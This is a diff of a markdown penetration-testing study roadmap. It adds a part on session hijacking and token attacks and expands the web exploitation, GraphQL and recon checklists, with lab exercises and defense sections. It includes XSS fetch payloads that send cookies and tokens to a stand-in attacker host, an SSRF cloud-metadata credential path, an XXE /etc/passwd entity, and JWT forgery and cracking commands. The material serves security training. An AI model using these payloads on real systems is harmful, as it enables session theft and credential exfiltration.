@@ -52,6 +52,10 @@
   - [Stage 4: Post-Exploitation & Persistence](#stage-4-post-exploitation-persistence)
   - [Stage 5: Defense & Mitigation (The Shield)](#stage-5-defense-mitigation-the-shield)
   - [Lab Progression (Part 17: Web Application Hacking)](#lab-progression-part-17-web-application-hacking)
+- [Part 12: Session Hijacking & Token Attacks](#part-12-session-hijacking-token-attacks)
+  - [Stage 1: Session Architecture & Vulnerability Analysis](#stage-1-session-architecture-vulnerability-analysis)
+  - [Stage 2: Token Theft & Interception Vectors](#stage-2-token-theft-interception-vectors)
+  - [Stage 3: Token Forgery & Replay](#stage-3-token-forgery-replay)
 - [Part 18: Web Server Hacking](#part-18-web-server-hacking)
   - [Stage 1: Target Acquisition & Reconnaissance](#stage-1-target-acquisition-reconnaissance)
   - [Stage 2: Scanning & Service Enumeration](#stage-2-scanning-service-enumeration)
@@ -152,11 +156,11 @@
 
 - [ ] **OSINT & Discovery:** Perform **Reconnaissance** using **Google Dorks, Shodan, Certificate Transparency** to find subdomains, exposed admin panels, and developer info.
 
-- [ ] **Service Enumeration:** Use `[nmap](../Tools/Nmap.md) -sV -sC` to identify web servers, versions, and common vulnerabilities.
+- [ ] **Service Enumeration:** Use `[nmap](Tools/Nmap.md) -sV -sC` to identify web servers, versions, and common vulnerabilities.
 
 - [ ] **Technology Fingerprinting:** Use **Wappalyzer, BuiltWith, WhatWeb** to identify frameworks, CMS, WAF, CDN, and backend technologies.
 
-- [ ] **Content Discovery:** Run **[Gobuster](../Tools/Gobuster.md), [ffuf](../Tools/ffuf.md), dirsearch** to find hidden directories, backup files, API endpoints, and admin panels.
+- [ ] **Content Discovery:** Run **[Gobuster](Tools/Gobuster.md), [ffuf](Tools/ffuf.md), dirsearch** to find hidden directories, backup files, API endpoints, and admin panels.
 
 - [ ] **Sitemap & Robots Analysis:** Parse **robots.txt, sitemap.xml, security.txt** for disallowed paths and contact info.
 
@@ -181,24 +185,43 @@
 ---
 
 <a id="stage-3-exploitation-the-owasp-top-10"></a>
-### **Stage 3: Exploitation (The OWASP Top 10)** — `🔬 Practical`
+### **Stage 3: Exploitation (The OWASP Top 10 & Modern Web Attacks)** — `🔬 Practical`
 
 > [!TIP]
-> **Goal:** Prove the vulnerability and gain access.
+> **Goal:** Prove the vulnerability, chain attack primitives, and achieve demonstrable impact.
 
-- [ ] **Injection Attacks:** Execute **SQL injection** for data extraction; **command injection** for RCE; **LDAP/XPath** injection.
+- [ ] **Injection Attacks:** Execute **SQL injection** (Union-based, Error-based, Blind Boolean/Time-based, Out-of-band); **OS command injection** for remote shells; **LDAP & XPath** injection.
 
-- [ ] **Cross-Site Scripting (XSS):** Deliver **reflected, stored, DOM-based** XSS to steal cookies, hijack sessions, or deface pages.
+- [ ] **Cross-Site Scripting (XSS):** Deliver **reflected, stored, and DOM-based** XSS. Bypass CSP filters, weaponize payloads to steal session tokens, execute keyloggers, and trigger client-side actions.
 
-- [ ] **CSRF & Request Forgery:** Construct **CSRF attacks** to perform state-changing actions; test **SSRF** for internal network access.
+- [ ] **Server-Side Request Forgery (SSRF) & Cloud Metadata Extraction:**
+  - Leverage SSRF to reach internal loopback services (`127.0.0.1`) and cloud metadata endpoints (`http://169.254.169.254/latest/meta-data/`).
+  - Extract temporary cloud credentials via instance profile role paths (`.../iam/security-credentials/<role>`).
+  - Bypass IP filters: alternate IP encoding (hex, dword, octal), DNS rebinding, IPv6 `[::]`, and URL parser discrepancies.
+  - Understand **AWS IMDSv2 defense**: requires session token via `PUT` with `X-aws-ec2-metadata-token-ttl-seconds: 21600` header — why IMDSv2 defeats simple GET-based SSRF.
 
-- [ ] **Authentication Bypass:** Exploit **logic flaws, password reset**, **JWT manipulation, OAuth misconfigs** to gain unauthorized access.
+- [ ] **Race Conditions & Concurrency Exploitation:**
+  - Exploit multi-threaded race windows using PortSwigger's **Turbo Intruder** (Single-Packet Attack over HTTP/2).
+  - Test for: limit-overrun attacks (redeeming discount vouchers multiple times), multi-endpoint race conditions (purchasing items without deducting balance), and race-driven password resets.
 
-- [ ] **File Upload Exploitation:** Bypass **filters** to upload **web shells** via **null bytes, double extensions, MIME confusion**.
+- [ ] **HTTP Request Smuggling & Protocol Desync:**
+  - Exploit inconsistencies between front-end reverse proxies and back-end servers parsing `Content-Length` vs `Transfer-Encoding` (`CL.TE`, `TE.CL`, `TE.TE`).
+  - Smuggle secondary HTTP requests into next client connections; hijack user sessions, bypass WAF rewrite rules, and poison web caches.
 
-- [ ] **Deserialization Attacks:** Exploit **unsafe deserialization** in Java/Python/PHP for RCE.
+- [ ] **CSRF & Request Forgery:** Construct **CSRF PoCs** to perform unauthorized state-changing actions; bypass weak Referer / Origin header checks and `SameSite` lax transitions.
 
-- [ ] **XXE & SSTI:** Parse **malicious XML** for file read; exploit **template engines** (Jinja2, Twig) for code execution.
+- [ ] **Authentication & JWT Attacks:** Exploit **logic flaws, password reset flows**, **JWT signature stripping (`none` algorithm), HMAC key confusion with public RSA keys, and weak secret brute-forcing**.
+
+- [ ] **File Upload Exploitation:** Bypass **content-type, magic bytes, and extension filters** to upload web shells via **null bytes, double extensions, path traversal, and polyglot files**.
+
+- [ ] **Insecure Deserialization & Template Injection (SSTI):** Exploit **unsafe deserialization** (Python `pickle`, Java `ysoserial`, PHP `unserialize`); identify SSTI in **Jinja2, Twig, Freemarker** to escape sandbox and gain RCE.
+
+- [ ] **XML External Entity (XXE):** Parse **malicious XML doctypes** with external entities (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) for local file disclosure, SSRF, and blind out-of-band exfiltration.
+
+- [ ] **WebSockets & Real-Time Protocol Security:**
+  - Test for **Cross-Site WebSocket Hijacking (CSWSH)** due to missing CSRF token validation or unvalidated `Origin` headers on WebSocket upgrade handshakes (`GET /ws HTTP/1.1 Upgrade: websocket`).
+  - Intercept, modify, and fuzz bidirectional WebSocket messages using Burp Suite WebSocket history and repeater.
+  - Assess rate limiting, schema validation, and authorization controls applied to asynchronous frames versus REST endpoints.
 
 ---
 
@@ -245,7 +268,7 @@
 | 2 | Exploit SQLi + XSS + SSRF on DVWA or OWASP Juice Shop | Attack chain documentation with request/response evidence |
 | 3 | Perform an authenticated web app assessment on WebGoat (all modules) | Structured vulnerability report |
 | 4 | Chain 3+ vulnerabilities for maximum impact on a single lab target (e.g., XSS→session theft→admin access→RCE) | Kill chain diagram + technical report |
-| 5 | Write a custom [Burp Suite](../Tools/Burp_Suite.md) extension or automated scanner script | Working extension/script + README |
+| 5 | Write a custom [Burp Suite](Tools/Burp_Suite.md) extension or automated scanner script | Working extension/script + README |
 | 6 | Complete 10 PentesterLab exercises (source-code-level web vulnerability analysis) | Exercise certificates + code review notes |
 | 7 | Solve 5 Root-Me web application challenges at intermediate difficulty | Challenge completion screenshots + methodology notes |
 
@@ -262,6 +285,131 @@
 
 > [!IMPORTANT]
 > **Move-On Gate:** You can perform a complete web application assessment covering OWASP Top 10, chain vulnerabilities for maximum impact, use Burp Suite professionally, and produce a client-ready web app pentest report.
+
+---
+
+<a id="toc-part-12-session-hijacking-token-attacks"></a>
+<a id="part-12-session-hijacking-token-attacks"></a>
+## Part 12: Session Hijacking & Token Attacks
+
+> [!NOTE]
+> **📚 Recommended Books for This Part**
+> - 🔴 `The Tangled Web` — Chapters on browser security models, cookies, origin boundaries, and session lifecycles
+> - 🟡 `The Web Application Hacker's Handbook (WAHH)` — Chapter 7: Attacking Session Management
+> - 🟢 `Real-World Bug Hunting` — Case studies on token leakage, OAuth account takeovers, and session fixation
+
+> [!IMPORTANT]
+> **Architectural Placement Note:** While legacy syllabi treat Session Hijacking as a generic network-sniffing concept, in modern networks (TLS ubiquitous, HSTS enforced) session attacks are almost exclusively application-layer exploits. This module directly builds on **Part 17: Web Application Hacking** (XSS, CSRF, Auth flaws) and prepares you for **Part 19: API Security** (OAuth2/OIDC token flows).
+
+---
+
+<a id="stage-1-session-architecture-vulnerability-analysis"></a>
+### **Stage 1: Session Architecture & Vulnerability Analysis** — `🔬 Practical`
+
+> [!TIP]
+> **Goal:** Deconstruct session state mechanisms, evaluate token entropy, and analyze browser security boundaries.
+
+- [ ] **Stateful vs Stateless Sessions:**
+  - **Stateful (Server-Side):** Database/Redis-backed sessions indexed by an opaque session ID (`PHPSESSID`, `JSESSIONID`, `ASP.NET_SessionId`).
+  - **Stateless (Client-Side):** Signed or encrypted tokens (JWT, Fernet, PASETO) where state lives in the client token and the server verifies signature validity.
+  - **Storage Analysis:** Inspect token residency in `Document.cookie`, `localStorage`, `sessionStorage`, or `IndexedDB`. Recognize that web storage (`localStorage`) is unconditionally readable by ANY XSS payload, bypassing `HttpOnly`.
+
+- [ ] **Cookie Attribute Security Profiling:**
+  - **`HttpOnly`:** Blocks JavaScript `document.cookie` access (mitigating basic XSS token exfiltration).
+  - **`Secure`:** Enforces transmission only over TLS (prevents cleartext sniffing).
+  - **`SameSite`:**
+    - `Strict`: Never sent in cross-site requests (highest CSRF protection).
+    - `Lax`: Sent on top-level safe GET navigations (default in modern Chrome/Firefox).
+    - `None`: Sent across all third-party contexts (requires `Secure` attribute).
+  - **`Domain` & `Path` Scope:** Evaluate overly broad domain scoping (`domain=.target.com`) permitting subdomain cookie injection (cookie tossing).
+
+- [ ] **Token Entropy & Predictability:**
+  - Capture sequences of session tokens using Burp Suite **Sequencer**.
+  - Analyze FIPS 140-2 randomness, Shannon entropy, and bit-level predictability to detect pseudo-random generation algorithms (PRNG seeding flaws).
+
+---
+
+<a id="stage-2-token-theft-interception-vectors"></a>
+### **Stage 2: Token Theft & Interception Vectors** — `🔬 Practical`
+
+> [!TIP]
+> **Goal:** Execute client-side and protocol-level attack chains to extract live authentication tokens.
+
+- [ ] **XSS-Based Token Exfiltration:**
+  - Craft asynchronous fetch payloads to transmit stolen cookies or web storage tokens to an attacker-controlled endpoint:
+    ```javascript
+    fetch('https://attacker-collaborator.net/log?c=' + encodeURIComponent(document.cookie));
+    fetch('https://attacker-collaborator.net/log?token=' + encodeURIComponent(localStorage.getItem('access_token')));
+    ```
+  - Bypass CSP restrictions (script-src, connect-src) via DNS prefetch exfiltration, dangling markup injection, or CSP bypass gadgets.
+
+- [ ] **Session Fixation:**
+  - Identify applications that maintain the pre-authentication session ID upon successful user login.
+  - Force a predetermined session token onto the victim via URL query parameter (`https://app.com/?session_id=attacker_token`) or subdomain Set-Cookie injection (`Set-Cookie: session_id=attacker_token; Domain=.company.com`).
+  - Once the victim authenticates using that session, take over the authenticated session using the known ID.
+
+- [ ] **CORS Misconfiguration Token Leaks:**
+  - Detect `Access-Control-Allow-Origin: *` or dynamically reflected origins paired with `Access-Control-Allow-Credentials: true`.
+  - Host an exploit page that issues authenticated requests and reads private session data or anti-CSRF tokens from the response body.
+
+- [ ] **Network-Level Interception (Legacy/Fallback Contexts):**
+  - In internal network assessments where TLS is missing or unpinned: ARP spoofing ([Bettercap](Tools/Bettercap.md)), DNS spoofing, and SSL stripping ([Bettercap](Tools/Bettercap.md) / [Burp Suite](Tools/Burp_Suite.md)) to harvest cleartext session headers.
+
+---
+
+<a id="stage-3-token-forgery-replay"></a>
+### **Stage 3: Token Forgery & Replay** — `🔬 Practical`
+
+> [!TIP]
+> **Goal:** Exploit stateless token architectures (JWT/OAuth) to forge administrative identities and replay stolen credentials.
+
+- [ ] **JSON Web Token (JWT) Exploitation ([jwt-tool](Tools/jwt-tool.md)):**
+  - **Algorithm Confusion (`alg: none`):** Strip or alter the signature header to `none` / `None` / `NONE` to test if the backend accepts unsigned payloads.
+  - **Key Confusion (RS256 ➔ HS256):** When a server uses asymmetric RS256, change the algorithm to symmetric HS256 and sign the token using the server's public key as the HMAC secret key.
+  - **Weak HMAC Secret Cracking:** Extract the signature and crack the secret offline using `hashcat -m 16500 jwt.txt rockyou.txt` or `jwt-tool -C -d dictionary.txt`.
+  - **JWK / JKU Header Injection:** Inject an attacker-controlled public key directly in the `jwk` header parameter or point the `jku` (JWK Set URL) parameter to an attacker server hosting a malicious JWKS file.
+
+- [ ] **OAuth 2.0 & OIDC Token Hijacking:**
+  - Exploit unvalidated `redirect_uri` parameters in the authorization code flow to leak authorization codes or implicit access tokens to an external host.
+  - Flawed state parameter implementation leading to CSRF-based account linking.
+  - Refresh token replay: Test if refresh tokens remain valid indefinitely without rotation or expiration upon password resets.
+
+---
+
+<a id="stage-4-defense-mitigation-the-shield"></a>
+### **Stage 4: Defense & Mitigation (The Shield)** — `🧠 Conceptual`
+
+> [!TIP]
+> **Goal:** Architect resilient session handling mechanisms resilient against client and network interception.
+
+- [ ] **Cryptographic Hygiene & Token Invalidation:**
+  - Issue cryptographically secure pseudo-random tokens (minimum 128 bits of entropy).
+  - Enforce complete session destruction on both client and server upon logout or timeout.
+  - Mandatory session regeneration: Generate a completely new session identifier immediately following any privilege transition or successful login.
+
+- [ ] **Hardened Cookie Flags:**
+  - Enforce `__Host-` or `__Secure-` cookie prefixes to prevent subdomain shadowing and cookie tossing.
+  - Strictly configure `HttpOnly; Secure; SameSite=Lax` (or `Strict` where practical).
+
+- [ ] **Modern Cryptographic Token Binding:**
+  - Implement **DPoP (Demonstrating Proof-of-Possession at the Application Layer - RFC 9449)** or **mTLS Token Binding** so stolen access tokens cannot be replayed from unauthorized client endpoints.
+  - Enforce strict single-use Refresh Token Rotation (RTR) with reuse detection (invalidating all tokens in the family if an old refresh token is reused).
+
+---
+
+<a id="lab-progression-part-12-session-hijacking"></a>
+### **Lab Progression (Part 12: Session Hijacking & Token Attacks)**
+
+| Level | Task | Deliverable |
+|-------|------|-------------|
+| 1 | Inspect cookie flags and entropy on a live web application using Burp Sequencer | Session randomness and security attribute audit report |
+| 2 | Execute a session fixation attack against a deliberately vulnerable web lab | Proof-of-concept showing authenticated state takeover via fixed session token |
+| 3 | Exploit Stored XSS to exfiltrate active session tokens to Burp Collaborator / webhook | Exploit payload + captured session token + authenticated impersonation evidence |
+| 4 | Attack JSON Web Tokens: perform `alg: none` bypass, RS256-to-HS256 key confusion, and crack a weak secret with Hashcat | Complete JWT exploitation report with modified token payloads |
+| 5 | Intercept and exploit a flawed OAuth2 implementation (leaking authorization codes via open redirect) | End-to-end OAuth account takeover writeup |
+
+> [!IMPORTANT]
+> **Move-On Gate:** You can systematically assess session management mechanisms, identify and exploit session fixation, steal tokens via XSS/CORS flaws, execute JWT signature and algorithm bypasses using `jwt-tool`, and design hardened, token-bound defense architectures.
 
 ---
 
@@ -322,7 +470,7 @@
 
 - [ ] **Service Exploitation:** Look for **buffer overflow, format string, RCE** exploits for specific service versions (Apache mod_ssl, ProFTPd, vsftpd).
 
-- [ ] **Credential Attacks:** Launch **brute force, password spray, dictionary attacks** against **SSH, FTP, admin panels** with [Hydra](../Tools/Hydra.md)/Medusa.
+- [ ] **Credential Attacks:** Launch **brute force, password spray, dictionary attacks** against **SSH, FTP, admin panels** with [Hydra](Tools/Hydra.md)/Medusa.
 
 - [ ] **Default Credentials:** Test **default admin passwords** for web servers (tomcat/tomcat, admin/admin) and management interfaces.
 
@@ -422,9 +570,12 @@
 > [!TIP]
 > **Goal:** Attack REST, GraphQL, gRPC, and SOAP distinctly.
 
-- [ ] **REST API Testing:** Chain **BOLA + privilege escalation**, test **HTTP verb tampering**, exploit **mass assignment** via undocumented writable fields.
-
-- [ ] **GraphQL Attacks:** Run **introspection queries** to dump full schema; exploit **batching/aliasing for DoS**, **nested query depth abuse**, **IDOR via node IDs**, and **mutations without auth checks**.
+- [ ] **GraphQL Attacks & Schema Extraction:**
+  - Execute **introspection queries** (`__schema`, `__type`) to recover the full type system, fields, queries, and mutations.
+  - If introspection is disabled, use **field suggestion enumeration** (e.g., Clairvoyance) exploiting server error feedback ("Did you mean ...?").
+  - Test for **batching & alias abuse** to bypass rate limits (sending hundreds of queries in a single HTTP request).
+  - Abuse **nested circular queries** (e.g., `author { posts { author { posts { ... } } } }`) to trigger server CPU exhaustion and Denial of Service.
+  - Exploit **Broken Object Level Authorization (BOLA)** on sensitive GraphQL mutations (updating user profile, assigning roles) where authorization checks are missing.
 
 - [ ] **gRPC Security:** Use **grpcurl, Evans** to enumerate services; test for **missing auth interceptors, reflection enabled in prod, proto injection**.
 
@@ -470,7 +621,7 @@
 | 1 | Complete crAPI (completely ridiculous API) lab — all OWASP API Top 10 challenges | Challenge completion documentation |
 | 2 | Test BOLA, broken auth, and mass assignment against vAPI or Juice Shop API | OWASP API assessment report |
 | 3 | Exploit JWT algorithm confusion (`alg:none`, RS256→HS256) and forge tokens in a lab API | JWT attack PoC + writeup |
-| 4 | Write automated API security tests using [Postman](../Tools/Postman.md) collections or Burp macros | Test suite + results |
+| 4 | Write automated API security tests using [Postman](Tools/Postman.md) collections or Burp macros | Test suite + results |
 | 5 | Audit a GraphQL API (introspection dump, batching abuse, nested query DoS, IDOR via node IDs) | GraphQL security assessment report |
 
 > [!IMPORTANT]
@@ -517,9 +668,21 @@
 > [!TIP]
 > **Goal:** Find what others missed.
 
-- [ ] **Subdomain Enumeration:** Use **OSINT** tools to find `dev`, `stage`, or `test` subdomains.
+- [ ] **Subdomain Enumeration & Asset Discovery:**
+  - Enumerate root domains, ASN blocks, and CIDRs using `amass`, `subfinder`, and `assetfinder`.
+  - Use permutation and alteration engines (`altdns`, `dnsx`) to discover unlinked staging and development infrastructure.
+  - Query Certificate Transparency logs (`crt.sh`) for newly minted wildcard certificates and shadow domains.
 
-- [ ] **Port Scanning:** Run `nmap` to identify non-standard ports (e.g., 8080, 8443) and running services.
+- [ ] **Port Scanning & Web Probing:**
+  - Run high-speed probes via `naabu` / `masscan` and resolve live web services via `httpx` (`httpx -title -tech-detect -status-code`).
+  - Run `nmap -sV -sC` against identified active ports to map out unusual web administrative interfaces.
+
+- [ ] **JavaScript Source Code Analysis & Endpoint Extraction:**
+  - Scrape and extract all internal endpoints, API keys, and routes from client-side JS bundles using `katana`, `LinkFinder`, or `gau` (GetAllUrls).
+  - Use `jsbeautifier` to deobfuscate source maps and uncover hidden feature flags and test routes.
+
+- [ ] **Hidden Parameter Discovery:**
+  - Discover undocumented query parameters and request body attributes using `arjun` or `x8` to uncover hidden debug modes, bypass parameters, or administrative switches.
 
 - [ ] **Tech Stack Analysis:** Use `curl` or browser extensions to identify the server, framework (React, Angular), and backend (PHP, Python).
 
